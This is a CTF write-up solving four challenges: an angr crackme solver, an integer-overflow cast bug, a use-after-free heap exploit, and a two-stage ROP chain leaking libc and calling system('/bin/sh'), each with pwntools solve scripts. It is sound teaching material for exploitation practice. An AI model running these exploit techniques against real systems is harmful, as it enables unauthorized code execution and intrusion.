## Rev/Easy-Crackme

![image](https://github.com/user-attachments/assets/0bb9c9fc-0c5f-4733-82f8-96ef33e8e61a)

Looking at the decompilation in Ghidra, we can just reassemble the flag from local_78 to local_4f but I decided to use angr to solve it.

<details>
<summary>Angr script</summary>

```py
import angr
import claripy

FLAG_LEN = 42
STDIN_FD = 0
base_addr = 0x00100000

proj = angr.Project("./easy_crackme", main_opts={'base_addr': base_addr})

flag_chars = [claripy.BVS(f"flag_{i}", 8) for i in range(FLAG_LEN)]                                               

flag = claripy.Concat( *flag_chars + [claripy.BVV(b'\n')])  # so that stdin works by adding \n to the end

state = proj.factory.entry_state(stdin=flag)

for c in flag_chars:					# make sure only printable characters
	state.solver.add(c >= ord('!'))
	state.solver.add(c <= ord('~'))

my_simgr = proj.factory.simgr(state)
find_addr = 0x00101435
avoid_addr = 0x0010145a 
my_simgr.explore(find=find_addr, avoid=avoid_addr)

if (len(my_simgr.found) > 0): # If a found state exists
	for found in my_simgr.found:
		print(found.posix.dumps(STDIN_FD)) # Print out the input
```

</details>

![image](https://github.com/user-attachments/assets/dd8c6a01-e80e-4f25-ab30-54c1e2fad345)

## :drop_of_blood: Pwn/Orcwars

![image](https://github.com/user-attachments/assets/21264960-b2c2-461c-91eb-f2ebbe3cfa66)

We are presented with a menu based game where we need to get more troops than the enemy

![image](https://github.com/user-attachments/assets/f8699ce3-687a-4789-bd29-237626d15822)

Our total troops must be at least 0x22a to get the flag.

![image](https://github.com/user-attachments/assets/6b8eeebf-0b8d-492b-9987-9bd50448e129)

The problem lies in the line `if ((int)local_34 < (int)(uVar5 * 100)) {`. The variable uVar5 is declared as an unsigned integer but is being casted to an integer. Hence, we can give a large number of mercenaries. After multiplying by 100, it should result in a negative number due to how integer works.

![image](https://github.com/user-attachments/assets/8903b488-c489-436b-84a8-cd229f4b0bd8)

Enter 1.1 billion

![image](https://github.com/user-attachments/assets/67e7ef6a-00e7-436b-b3aa-f8d4b575d062)

Fake flag because the remote server is not active anymore, so I just ran this locally.

## :drop_of_blood: Pwn/Flag-service

![image](https://github.com/user-attachments/assets/f717f137-9dee-48e0-929d-40b98517fa8a)

Another menu type challenge.

<details>
<summary>Decompiled Code</summary>

```c
    switch(uVar3) {
    case 0:
      puts("not a valid input\n");
      break;
    case 1:
      puts("enter your name :");
      if (local_20 != (undefined8 *)0x0) {
        free(local_20);
      }
      local_20 = (undefined8 *)malloc(0x10);
      puVar4 = (undefined8 *)fgets((char *)local_20,0x10,stdin);
      if (puVar4 == local_20) {
        sVar5 = strlen((char *)local_20);
        *(undefined *)((long)local_20 + (sVar5 - 1)) = 0;
      }
      else {
        puts("error with name !");
        *local_20 = 0x6e776f6e6b6e75;
      }
      break;
    case 2:
      puts("how many flags do you want ? \n(100$ per flag, max 9999 flags)");
      nbflag = get_int_input(1,9999);
      if (!deleted) {
        free(order);
      }
      order = (uint *)malloc(8);
      order[1] = nbflag;
      *order = nbflag * 100;
      printf("you want %d flags, which will cost %d$\n",(ulong)nbflag,(ulong)(nbflag * 100));
      deleted = false;
      fflush(stdin);
      break;
    case 3:
      if (deleted) {
        puts("you don\'t have any order to delete");
      }
      else {
        order[1] = 0;
        *order = 999;
        free(order);
        deleted = true;
        puts("you deleted your order !");
      }
      break;
    case 4:
      if (((int)*order < 0) || ((int)money < (int)*order)) {
        puts("you don\'t have enough money to buy those flags !");
      }
      else {
        money = money - *order;
        flags = order[1];
        puts("you successfully bought the flag !");
        printf("you now have %d flags\n",(ulong)flags);
      }
      if (0 < (int)flags) {
        print_flag();
        bVar2 = false;
      }
      break;
    case 5:
      puts("Bye !");
      bVar2 = false;
      break;
```

</details>

There is a Use-After-Free (UAF) vulnerability in option 3 when deleting an order. After freeing the chunk, the order variable is not set to NULL so the pointer to the freed chunk is still able to be used. Another thing to keep in mind is that malloc(0x8) and malloc(0x10) will return the same sized chunk because the minimum size for a heap chunk is 0x10 bytes (excluding metadata). Hence, the steps of our attack will be as follows

- Create an order chunk
- Delete that order chunk
- Allocate the name chunk, the contents of this chunk will reflect your order chunk. Hence, just make the price of the flag to become $1
- Profit

<details>
<summary>Solve Script</summary>

```py
#!/usr/bin/python
from pwn import *
import warnings
import time

warnings.filterwarnings("ignore",category=BytesWarning)

exe = context.binary = ELF('./flag_service')
libc = exe.libc

host = "flag-service.warzone-challenges.com"
port = 1339

gdb_script = '''

'''

r = lambda x: p.recv(x)
rl = lambda: p.recvline(keepends=False)
ru = lambda x: p.recvuntil(x, drop=True)
cl = lambda: p.clean(timeout=1)
s = lambda x: p.send(x)
sa = lambda x, y: p.sendafter(x, y)
sl = lambda x: p.sendline(x)
sla = lambda x, y: p.sendlineafter(x, y)
ia = lambda: p.interactive()
li = lambda s: log.info(s)
ls = lambda s: log.success(s)

def debug():
  gdb.attach(p)
  p.interactive()

p = exe.process()
# p = remote(host,port)
#p = gdb.debug('./', gdbscript = gdb_script)

sla(b"exit\n", "2")
sl("1")
sla(b"exit\n", "3")
sla(b"exit\n", "1")
sl(p32(1) + p32(1))
sla(b"exit\n", "4")

p.interactive()
```

</details>

![image](https://github.com/user-attachments/assets/93cbac59-c515-4e0d-99f8-18d7dc772f94)

## :drop_of_blood: Pwn/BabyROP

![image](https://github.com/user-attachments/assets/0a8006ec-9719-4f98-ab92-dcd8055affbf)

Classic BOF challenge with no win function, and only puts() imported into the binary.

![image](https://github.com/user-attachments/assets/4ddff79b-4cb4-49c3-91e0-b8f10dfe90a6)

A pop rdi gadget also conveniently placed for us. Our exploit will be split into 2 stages. First we must leak libc, then we should execute a ret2system.

### Stage 1 payload

```py
offset = 24
pop_rdi = 0x0000000000401283# : pop rdi ; ret

payload = b"a" * offset
payload += p64(pop_rdi)
payload += p64(exe.got["puts"])
payload += p64(exe.plt["puts"])
payload += p64(exe.sym.main)
```

We will overwrite the return address to call puts() and use the GOT address of puts as the argument, then we will loop back to main to trigger BOF again and run our 2nd stage.

![image](https://github.com/user-attachments/assets/d58b7404-de82-418d-8ed0-0e6f006216b9)

We have successfully leaked the libc address `\xa0\xc5s\x8d\x88\x7f`

```py
leak = u64(rl().strip().ljust(8, b"\x00"))
print("leak @ ", hex(leak))
libc.address = leak - libc.sym["puts"]
li(f"libc @ {hex(libc.address)}")
```

We can calculate the base of libc with this.

```py
system = libc.sym["system"]
binsh = next(libc.search(b"/bin/sh\x00"))
```

Now, we can search for the address of system() and the string "/bin/sh"

```py
payload = b"a" * offset
payload += p64(pop_rdi+1)
payload += p64(pop_rdi)
payload += p64(binsh)
payload += p64(system)
```

Finally, we can craft our payload to give us RCE.

<details>
<summary>Solve Script</summary>

```py
#!/usr/bin/python
from pwn import *
import warnings
import time

warnings.filterwarnings("ignore",category=BytesWarning)

exe = context.binary = ELF('./babyROP_patched')
libc = ELF('./libc.so.6')

host = "baby-rop.warzone-challenges.com"
port = 1343

gdb_script = '''

'''

r = lambda x: p.recv(x)
rl = lambda: p.recvline(keepends=False)
ru = lambda x: p.recvuntil(x, drop=True)
cl = lambda: p.clean(timeout=1)
s = lambda x: p.send(x)
sa = lambda x, y: p.sendafter(x, y)
sl = lambda x: p.sendline(x)
sla = lambda x, y: p.sendlineafter(x, y)
ia = lambda: p.interactive()
li = lambda s: log.info(s)
ls = lambda s: log.success(s)

def debug():
  gdb.attach(p)
  p.interactive()

p = exe.process()
# p = remote(host,port)
#p = gdb.debug('./', gdbscript = gdb_script)

offset = 24
pop_rdi = 0x0000000000401283# : pop rdi ; ret

payload = b"a" * offset
payload += p64(pop_rdi)
payload += p64(exe.got["puts"])
payload += p64(exe.plt["puts"])
payload += p64(exe.sym.main)

sl(payload)

rl()
rl()
rl()
leak = u64(rl().strip().ljust(8, b"\x00"))
print("leak @ ", hex(leak))
libc.address = leak - libc.sym["puts"]
li(f"libc @ {hex(libc.address)}")

system = libc.sym["system"]
binsh = next(libc.search(b"/bin/sh\x00"))
li(f"libc @ {hex(system)}")
li(f"libc @ {hex(binsh)}")

payload = b"a" * offset
payload += p64(pop_rdi+1)
payload += p64(pop_rdi)
payload += p64(binsh)
payload += p64(system)

sl(payload)

p.interactive()
```

</details>

![image](https://github.com/user-attachments/assets/ac124e0b-c206-4a4a-b782-4783f527e287)
